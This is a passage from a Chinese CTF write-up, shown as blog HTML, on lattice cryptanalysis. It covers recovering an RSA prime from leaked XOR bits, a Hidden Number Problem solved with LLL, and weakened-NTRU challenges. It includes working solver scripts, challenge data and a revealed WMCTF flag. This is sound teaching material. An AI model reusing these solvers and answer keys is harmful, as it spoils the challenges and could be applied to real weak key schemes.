!)nf&#125;]-?/\)&#123;]]]_&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;_]]&#125;&#125;&#123;\/?-][)vf?`          </span></span><br><span class="line"><span class="string">          &#x27;!tX/&#125;]--&lt;]&#123;\Un[~~&lt;&lt;&lt;&lt;&lt;~~&lt;~-11Yz)&lt;--?[&#123;vv[&quot;.         </span></span><br><span class="line"><span class="string">         .&lt;&#123;xJt&#125;]?!ibm0%&amp;Ci&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;!0kJW%w+:-?[&#123;uu)&#125;,         </span></span><br><span class="line"><span class="string">          !1fLf&#125;]_::xmqQj[&quot;I~&lt;&lt;&lt;&lt;&lt;&lt;&gt;&quot;(ZqOu&#123;I^&lt;?[&#123;cc)[`         </span></span><br><span class="line"><span class="string">          `&#125;|x\&#125;]_+&lt;!&lt;+~&lt;&lt;__~&lt;&lt;&lt;&lt;&lt;&lt;+_&lt;&lt;_+&lt;&gt;&lt;++-[1j/(&gt;          </span></span><br><span class="line"><span class="string">           !\j/&#123;]-++___--_+~~&lt;i;I&gt;~~~__-______?&#125;(jf&#125;`          </span></span><br><span class="line"><span class="string">            ;~(|&#125;?_++++~~++~+]-++]?+++~~~~+++-[1/]&gt;^           </span></span><br><span class="line"><span class="string">              ;\([?__+_-?]?-_-----__-]?-_+++-]&#123;/].             </span></span><br><span class="line"><span class="string">               l||&#125;?__/rjffcCQQQQQLUxffjf&#125;+-]1\?&#x27;              </span></span><br><span class="line"><span class="string">                ,[\)[?&#125;&#125;-__[/nzXXvj)?__]&#123;??&#125;((&gt;.               </span></span><br><span class="line"><span class="string">                 .I[|(1&#123;]_+~~~&lt;~~&lt;&lt;&lt;~+_[&#125;1(1+^                 </span></span><br><span class="line"><span class="string">                    ,~&#123;|\)&#125;]_++++++-?&#125;1)1?!`                   </span></span><br><span class="line"><span class="string">                      .&quot;!_]&#123;11))1&#123;&#125;]-+i:&#x27;                      </span></span><br><span class="line"><span class="string">                          .`^&quot;,&quot;^`&#x27;.                           </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">bit</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        P = getPrime(bit)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(P)) - <span class="number">2</span> == bit:</span><br><span class="line">            <span class="keyword">return</span> P</span><br><span class="line"></span><br><span class="line">pq_bit = <span class="number">512</span></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">P,Q = [gen_prime(pq_bit) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">N = P * Q</span><br><span class="line">gift = <span class="built_in">int</span>(<span class="built_in">bin</span>(P ^ (Q &gt;&gt; offset))[<span class="number">2</span>+offset:],<span class="number">2</span>)</span><br><span class="line">pr(N)</span><br><span class="line">pr(gift)</span><br><span class="line"></span><br><span class="line">inpP = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> inpP != P:</span><br><span class="line">    pr(<span class="string">b&quot;you lose!&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">secret = randrange(<span class="number">0</span>,P)</span><br><span class="line">bs = [randrange(<span class="number">0</span>,P) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>)]</span><br><span class="line"></span><br><span class="line">results = [(bi * secret) % P <span class="keyword">for</span> bi <span class="keyword">in</span> bs]</span><br><span class="line">rs = [ri &amp; (<span class="number">2</span> ** offset - <span class="number">1</span>)  <span class="keyword">for</span> ri <span class="keyword">in</span> results]</span><br><span class="line"></span><br><span class="line">pr(bs)</span><br><span class="line">pr(rs)</span><br><span class="line">inpsecret = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> inpsecret == secret:</span><br><span class="line">    pr(flag)</span><br></pre></td></tr></table></figure><p>解题：</p><p>首先是获取p 高位泄露了十六位 虽然这16位未知 但是可以通过设置16bit长度的所有情况进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">73112325447718419004547130726695718285793085958231107892863489717428446716838799849309454056415849869930556787026583737635045001044331824958338557356039885155281113144595678795533444159689102603206422423835572911701365510630670709050480182217561850257781379648014791821272434711481938951190881233041060596523</span></span><br><span class="line">gift1 = <span class="number">115073356145766093260644381479331808320549133985413353306940738670775007719301812510687311522173487690937202937075087659433551944224376340973897790917</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">gift1,N</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">        gift = <span class="built_in">int</span>((<span class="built_in">bin</span>(i)[<span class="number">2</span>:] + <span class="string">&#x27;0&#x27;</span> * (<span class="number">496</span>-gift1.bit_length()) + <span class="built_in">bin</span>(gift1)[<span class="number">2</span>:]),<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># bin(gift1)[2:]也许并非496bits,可能前导0会省略，自行加上即可</span></span><br><span class="line">        pbar = gift &gt;&gt; (<span class="number">512</span>-<span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                qbar = (N &gt;&gt; (<span class="number">1024</span> - pbar.bit_length()*<span class="number">2</span>) )//pbar</span><br><span class="line">                <span class="comment"># print(qbar,qbar.bit_length())</span></span><br><span class="line">                qbar = qbar&gt;&gt;<span class="number">6</span></span><br><span class="line">                gifts = gift^(qbar&lt;&lt;(<span class="number">512</span>-<span class="number">16</span>-qbar.bit_length()))</span><br><span class="line">                pbar = gifts &gt;&gt; (<span class="number">512</span>-<span class="number">16</span>-qbar.bit_length())</span><br><span class="line">                <span class="comment"># print(pbar,pbar.bit_length())</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="comment"># print(i)</span></span><br><span class="line">            P = (pbar &lt;&lt; <span class="number">6</span>) + i</span><br><span class="line">            <span class="keyword">if</span> N % P == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(P)</span><br><span class="line">                <span class="keyword">return</span> P</span><br><span class="line">get_p(gift1,N)</span><br><span class="line"><span class="comment">#9463395021022080495725625579099709864198202996192818493676075430361086175809577174253865589866353281287908307347544682931439681148579311956298173287376473</span></span><br></pre></td></tr></table></figure><p>上面的脚本来源于DASCTF的比赛中</p><p>然后获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bs = [<span class="number">5677770056347952821075508113035756036186750810935744246746174143756447222899456626676391801166125401365094827195531579218729867555316702975753784979244872</span>, <span class="number">2809620694316973743070419046517422880935575351562028606467262358149044880922143772187834653369648207268652362409857479009595884652141674028997687008458065</span>, <span class="number">3730270319847639205056610760089899175546681287012108868443801789244300006477333256569065708981917617890953379697372414414912864801523329022800590644960859</span>, <span class="number">5821308517313693876194723672109113624898735347480525042736754342702714857466473605555360227316768264216216522199834049459503113541382232261257078279373457</span>, <span class="number">7447756417909132324727804644545090515712348538866555221605506449994661595686624719179141597003925585021790315500290856582501600080206760793845807465435020</span>, <span class="number">2105762400848182586132539753964540320116345826242628146908489443753704312166929959947252892375240925912179106904028258517572657190458322323487967161677844</span>, <span class="number">154222298643104769325471310127340263916626139056136380962227349123299727085462094219564859503955889867523024467685219898520433147625254371592982600111385</span>, <span class="number">367828597395145770863382274648759911062421189249171333962353712349023993039851982532446913020406236969002463928822493235022843178244026427116420194632581</span>, <span class="number">1744200243856922563638772245369402677344028894603176201806040819068039225056278405389760818145017936368618817981571303260147110007739148296698937928843957</span>, <span class="number">5670406830778390730892641103362280301437252102865399395897422175624950243883078098199467864852521793872723428112979163916452992415911855252561215571391096</span>, <span class="number">4961373637791936223513400147782916563460190344580138422212799905208967588487213074873328658685093590342512783917670377711041783156851600713671476077404515</span>, <span class="number">5698904648841393994633450812750517199427982232619699696607698886438569980287267613186832256695574376500824006722753065479452944587472798782966294826498729</span>, <span class="number">2626611375827255664624275815248180600584539394441361715415622910267378140077728375819890115849477614869513835180911315948024350530246241990148027000003247</span>, <span class="number">4322432241215029052699237939341147131781420863250895517172680568672381909970064344040583613368923347568958321349659728727935451755378705244016710439641158</span>, <span class="number">1928419605038168764733449488709516192222335662921906459617704643151339384031358440020680276054871198671008628593620415807919003359787851822611275504761125</span>, <span class="number">758298969674788958681232125590769643791657077138037129139238209955794187834098615443521161703003644497548029106392839914740987840120821133758808191162464</span>, <span class="number">3026120713365180411884841936693672667286076351283725117739841509938175342066894932925924493822077276291978462795149635713410275262432016154092995131815069</span>, <span class="number">2639116385581133273068720849577714988914606374248136639831733592282012712583006465901110461383725143920082598753614952697933130060915300957054627629274585</span>, <span class="number">4938477885775391845441227660717435985351368416989649995935420783949796408027814914819890996906576154691050558257513298894204488415414648705103499910642769</span>, <span class="number">2586664093376881328787412631902927222753380482805791009422685269787127535644112074624071376797161243100602355098533019790821633292169346061029222356230765</span>, <span class="number">5553524741480099301054134204590300647682160064680815429649202130132178700086891659413819279328100036520027466610196402070124870933103957456304029253248732</span>, <span class="number">2827265379921181842866192519714225788148235787193890010891768669101713572608744951067703090450722162825909298999736141026042400464118472320665041675681263</span>, <span class="number">1882191527950117171689633117483662158586807501384802095608221879095319572751646959308080890743755189350869028885412995726442493419408160192448934636247969</span>, <span class="number">2624940783149957630052421415813956884561052534178680577595486675851951652761799600473953641982211067073776832889577908624789277943579205813592153885774787</span>, <span class="number">4557357589224938072027907497871251728077025399913277406228025890486316538978785358037884170649353496980491294290693236049954003081546235618935408233617781</span>, <span class="number">7503029892737975260686578470850749871382063215806103289417981959410942610953159314048524316989907513945454856136605901215014386958175836168455433495976840</span>, <span class="number">1481777615800981231353277825715461294317126131020372161819681326609658389423517292725626585141062920702092668619196067362128544725577006335263310427517720</span>, <span class="number">4195773140329253432252020288295924419191899561410667997498026712138128661788879368987893473405403124672999850771991585172310110744585123235362358448299402</span>, <span class="number">2003064111894296519054159734832793727058000516309777321077086228674560695531194066337528308841114906348141481465145488329210441174025042039646886744834307</span>, <span class="number">4508799626502269807611012496586770184190543351868505425146984121925038328927083771111700038861067084320342153568829171227980347727670336894671033305242053</span>, <span class="number">7141804680199937247962418027088222230735127547115123066765929692165221036432525181252245983667408692953252722174487387892809455275282654904239693974086313</span>, <span class="number">5386588055094784356165732781468142654808326535838628874938909372336169451891308083974558803497079135496650858231780699255029869995091026814783880851641095</span>, <span class="number">3782247624308335907897302856903747821512994875858417290191847604012849621190843084580777781441506763452934236540908617447821210352445344355717216720464659</span>, <span class="number">6527778172523455296666844889020389423098061136790050978799819429528238066483905902635991546245979582351890944412859630132736333005922929043047216254655955</span>, <span class="number">5307533726050766654822554741434396225884902691951304818603268654194614151318601582366056716061741240768755295434943924934683158909386226742299206040764766</span>, <span class="number">6680436528531848639646280824606034416195797982786801625729333386638769190461881575679794466409308819912401578516938662856219054823471163813941387223410656</span>, <span class="number">4887886672739126992557813239689644986751862892155246272416338920125998621231513182487516658592072003303553787101714685075776658032850821479355562756508038</span>, <span class="number">5265204245228171606770934463863274787963598538267041606291043095828239507419258123084718784524021414827606114852174671998385402424450055415134204339454340</span>]</span><br><span class="line">rs = [<span class="number">52066</span>, <span class="number">892</span>, <span class="number">50690</span>, <span class="number">29942</span>, <span class="number">23820</span>, <span class="number">24568</span>, <span class="number">19387</span>, <span class="number">20149</span>, <span class="number">46735</span>, <span class="number">35698</span>, <span class="number">53743</span>, <span class="number">48283</span>, <span class="number">2606</span>, <span class="number">61775</span>, <span class="number">18568</span>, <span class="number">38317</span>, <span class="number">52156</span>, <span class="number">52935</span>, <span class="number">23846</span>, <span class="number">10329</span>, <span class="number">24461</span>, <span class="number">64490</span>, <span class="number">1493</span>, <span class="number">36508</span>, <span class="number">32478</span>, <span class="number">65455</span>, <span class="number">43594</span>, <span class="number">57024</span>, <span class="number">50048</span>, <span class="number">15644</span>, <span class="number">52839</span>, <span class="number">22357</span>, <span class="number">14660</span>, <span class="number">51589</span>, <span class="number">19077</span>, <span class="number">26899</span>, <span class="number">32189</span>, <span class="number">17131</span>]</span><br></pre></td></tr></table></figure><p>利用hnp 获得secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = randrange(<span class="number">0</span>,P)</span><br><span class="line">bs = [randrange(<span class="number">0</span>,P) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>)]</span><br><span class="line"></span><br><span class="line">results = [(bi * secret) % P <span class="keyword">for</span> bi <span class="keyword">in</span> bs]</span><br><span class="line">rs = [ri &amp; (<span class="number">2</span> ** <span class="number">16</span> - <span class="number">1</span>)  <span class="keyword">for</span> ri <span class="keyword">in</span> results]  <span class="comment">#这里只是格式的规范化数值不变 与的内容是16bits的1 相当于对2的16次方取模</span></span><br></pre></td></tr></table></figure><p>根据上式得到利用hnp的公式：ri % 2**16 = bi * secret (mod p)</p><p>ri = bi * secret % p % 2**16</p><p>ri = bi * secret + kp + l * 2**16</p><p>l * 2**16 = ri - bi * secret - kp</p><p>l = ri * inverse - bi * secret * inverse - kp (其中k和l以乘任何其他数都可以用k和l表示作为任意倍数关系)</p><p>inverse = inverse(2**16,p)</p><p>两边同时乘-1</p><p>l = bi * inverse * secret - ri * inverse + kp</p><p>ki = Ai * x + Bi 到此成功构造hnp式子</p><p>其中</p><p>p是512bits</p><p>bi secret 小于512bits</p><p>ri 16bits</p><p>l  小于 p bit位数就行 作为密钥 设为496bits</p><p>K是轮密钥的上界</p><p>构造格子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9463395021022080495725625579099709864198202996192818493676075430361086175809577174253865589866353281287908307347544682931439681148579311956298173287376473</span></span><br><span class="line">b = [<span class="number">6099745272052586004179912608738971034534930536137743613897081917185107394368705591323971750395506839750452649288267772188419489756675205679949408086451232</span>, <span class="number">3951191747812729045440242820895124607189480251095163295242628450942998752364973601131023646206377502005591988554681151953526704565202075013281769088815523</span>, <span class="number">1404420597554404030107272770922253996678162333687352195618251218863999850248824692838151822875031075053556888677319712477280556217652901167451648905364386</span>, <span class="number">4488294572333656708259420377539737505003996159677656468026097114601711607985567015550450770914323371829296766770532559711193361180597308950367687185966302</span>, <span class="number">5481102322187479419436505829074865646684095327365195150222467418442873465357487402747218531517017371054667814520443813042860956594726076176855372054132653</span>, <span class="number">2713802788133698269409249999536200419140314121130473258656206052429002170951741696862581935955915442467962543363756219468741646383480138223283730677285687</span>, <span class="number">4388471418937878873760244311226931102311967761139597301227595095454037495066960891301104963760391091058605030114648033892461656189445282496553583505973028</span>, <span class="number">736776464731641575781839292404124851285324500513593675528872423711514787996001241149637426869001948983773230073266488914216375314221965655672656410584443</span>, <span class="number">8708590989237325341864969642266721092908150322862807883501307022447092127465507299112990850265948137001397701186114982614486130822490540038423320215334626</span>, <span class="number">9267802304424548397960617736597723635936811251609846290761762903654804678628923862108480264307805107896646269881938313148864202456071920121260093838052525</span>, <span class="number">3247108183860325987343060073325154780063121072412546176464075975152503493018889336496636379292425449406827070404175667145192082945885628262842725864496476</span>, <span class="number">455724435639473173230575250620919313737714978926744740871167992567140510847659696368128186714204899204016766561731806278682654146614456839201295265351084</span>, <span class="number">9020040064239438957325652010732562703496153379776291386479249377336002129977498901663356523568148111515751758815532962162768918028366620424504879498916260</span>, <span class="number">7688416580027582769915116662018701330731542853610728083638475681090388890585799679692871117954618858316092856071130163834051800086038254809868956867017534</span>, <span class="number">2914081803071475210765607707004526189627879912343305436165346830733180111712927683631299251265551199278425089831815911602268284636090898745079700939295508</span>, <span class="number">1682447624444059192944751083327557927345592086507420627567050313041103192041463642408780131750529259046595170811376763889856062916108841799386014250209204</span>, <span class="number">5341034619247476123738204666831636378756603282709541857595527812139022510035477000927339770989486054395218479620330803691178416464134942884723827374332572</span>, <span class="number">8376329702107133848458122442144946089340952412870283575988871694491609215583935392751355281411100977914041577559011007450313560473364023276862308392837927</span>, <span class="number">9416263788845104843254295633755080717027180798661946550343273052573861692993756745844265654941124801439244186152547374828735493445699134588163894749640836</span>, <span class="number">2932216738770537817881515093909708415125754815604299999068133848728425671241756819969645781862996905460305910366082553247028095515273709817106865465122590</span>, <span class="number">8097717669926537250731305609873869963442989665404721303119492230921259587448045170648745406003491170455200904721392690716080842205006420218957357208236777</span>, <span class="number">2320095372469412381123081241813969183059217183055092564165616040030126466741691823966421813308525807455783827406201671916779545841711101790509143391460558</span>, <span class="number">2333972164269303480468982231430944844261058855427800172027932923131801032739273832904738225066210544462847760672864166563796956687623202151756145595323299</span>, <span class="number">9437506711046580131962727129679057367842176159058408153672713703801123411305447877847753662475828865148714651927615052959365575959980181945973888298104933</span>, <span class="number">5802961795945602293929959252989205060907182950209184792016006564685164829079522333038011701596715377738492900250485584441351844045455427769773524087524156</span>, <span class="number">529599427933984238231472476175004896612420169200926563371105835757115041890610229232923121353193340603425988395343027602415343623433336040543795697317090</span>, <span class="number">6402196372034668863055877348065973921962422590516519136977866652600902486323081042430853494022971845631884452544526687998575817840711058028440421779395606</span>, <span class="number">1230624307875405241534590705586346034433600380745178644341864997283918237998339933919925940523713299382838409046998100995049951280382526255707022024214853</span>, <span class="number">4939399750563474831690751351208621006534538497525744056731033390661498923441407195386308647381246454241105286776645577202434999611495000302402098783151142</span>, <span class="number">3991859998040542133259043036343592584436362790235923761833962209989024458819225460294422336721726048826788046849829864060207989750046644621835589699009365</span>, <span class="number">240857736341741610087615111623321249370900668053282004036464835672779328135852021912344864307291860960709711372109427660351057177543937799209410049857688</span>, <span class="number">3616083502398202892601882038165628001289992103457989351932690769228627486934029132426774534679657144138989265564646117621513540781010324410148517674825531</span>, <span class="number">5404612891952879264496112103405811484626424108411041737043110667122266883638660766432812414542841773559389510234873119005979364687689717241678676878972572</span>, <span class="number">2034451564894992453342874697889924929640864497213866812897528594902646690104681644785346511630568960798405400466505451930160617969903308178504532997741868</span>, <span class="number">6157490304505265465913231571555412606905748047618103662427174891510009729459475829640015546085845764226272377180939793932164111694580454672032316588788226</span>, <span class="number">4975964317099024183607476155053005595563615534064262974131837949918711606891694740515965242556735284295717544308022169459365947195601426949094207557584822</span>, <span class="number">5428476883706514219777167145065847042077736528683727164449312172005302805331073867565107042753732467573625669359225318663458427411189319424302379038071051</span>, <span class="number">1671914205500553673647970410143909519671590636952787351672356207441593565754364343607635690418391473360926097632568317796984733317042685849430234554815858</span>]</span><br><span class="line">r = [<span class="number">48997</span>, <span class="number">62415</span>, <span class="number">23955</span>, <span class="number">36908</span>, <span class="number">52443</span>, <span class="number">4523</span>, <span class="number">22645</span>, <span class="number">22555</span>, <span class="number">31815</span>, <span class="number">15691</span>, <span class="number">47858</span>, <span class="number">27532</span>, <span class="number">21464</span>, <span class="number">23465</span>, <span class="number">45849</span>, <span class="number">59181</span>, <span class="number">27490</span>, <span class="number">6614</span>, <span class="number">16702</span>, <span class="number">57463</span>, <span class="number">52700</span>, <span class="number">28969</span>, <span class="number">31173</span>, <span class="number">41233</span>, <span class="number">61893</span>, <span class="number">36368</span>, <span class="number">17734</span>, <span class="number">53549</span>, <span class="number">17913</span>, <span class="number">33308</span>, <span class="number">63024</span>, <span class="number">61345</span>, <span class="number">33511</span>, <span class="number">53005</span>, <span class="number">26113</span>, <span class="number">59084</span>, <span class="number">35720</span>, <span class="number">44204</span>]</span><br><span class="line"></span><br><span class="line">M = matrix(QQ,<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">inv = invert(<span class="number">2</span> ** <span class="number">16</span>,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    M[i,i] = p</span><br><span class="line">    M[-<span class="number">2</span>,i] = b[i] * inv  <span class="comment">#Ai</span></span><br><span class="line">    M[-<span class="number">1</span>,i] = -r[i] * inv  <span class="comment">#Bi</span></span><br><span class="line">    </span><br><span class="line">M[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">2</span> ** <span class="number">496</span> / p   <span class="comment">#K/p</span></span><br><span class="line">M[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span> ** <span class="number">496</span>   <span class="comment">#K</span></span><br><span class="line"></span><br><span class="line">L = M.LLL()</span><br><span class="line"></span><br><span class="line">res = L[<span class="number">1</span>][-<span class="number">2</span>].numerator() / <span class="number">2</span> ** <span class="number">496</span></span><br><span class="line"><span class="comment"># 或 res = L[1][-2] / (2 ** 496 / p) % p</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 1005444529226476196286726437221411001182466035947403146822894574200213482908472882296123424897230218596631139138335919912390102402492391521467426075919696</span></span><br><span class="line"><span class="comment"># wmctf&#123;we1c0me_brOo0Oo!hope_y0u_h4v3_fun_iN_the_fTcmWWmcTf/&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535699.png" alt="image-20230827122809032"></p><p>M作为基向量 l作为系数a  相乘构建出L的其他基向量m （多解） 选择其中第二短的v</p><h2 id="nss工坊刷题">NSS工坊刷题</h2><blockquote><p>因是NSS工坊里面的题目，所以就不放数据啦，想学的师傅真心推荐去工坊买一下，十几块钱真的不贵，而且学格这一块，自己有数据多调调参数才有意义，自己拿到flag，才能提高学习的积极性，师傅们冲冲冲！</p><p>链接：<a href="https://www.nssctf.cn/problem/sheet/11086">https://www.nssctf.cn/problem/sheet/11086</a></p></blockquote><h3 id="p1-：弱化版ntru">P1 ：弱化版NTRU</h3><p><a href="http://task.py">task.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">f = getPrime(<span class="number">400</span>)</span><br><span class="line">g = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">h = inverse(f, p) * g % p</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">c = (r*h + m) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;h = <span class="subst">&#123;h&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 。。。</span></span><br><span class="line"><span class="string">h = 。。。</span></span><br><span class="line"><span class="string">c = 。。。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>整个题目和上面的ez_ntru是完全一样的</p><p>首先是构造格 使用Hermite定理判断一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span> ** <span class="number">0</span>   <span class="comment">#这是不断调整配平用的</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)  <span class="comment">#已知</span></span><br><span class="line">f = flag = getPrime(<span class="number">400</span>)   </span><br><span class="line">g = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值 大于等于下面的即可</span></span><br><span class="line">temp = gmpy2.iroot(<span class="number">2</span> * b * p, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#bit = (248 + 512) / 2</span></span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#最短向量的值</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(b*g)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment">#主要在于f g没有太大影响</span></span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> temp.bit_length() &gt;= temp2.bit_length():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535700.png" alt="image-20240719181259983"></p><p>本身就满足 所以不需要调平</p><p>具体原理参考上面的ez_ntru</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">p = 。。。</span><br><span class="line">h = 。。。</span><br><span class="line">c = 。。。</span><br><span class="line"><span class="built_in">print</span>(h.nbits(),p.nbits())</span><br><span class="line">D = <span class="number">2</span>^<span class="number">0</span>  <span class="comment">#配平数与位数相关 需要学习补充 237-256次方均可解</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步 构造格 获取f和g</span></span><br><span class="line"><span class="comment"># Construct lattice.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, D * h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, D * p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span 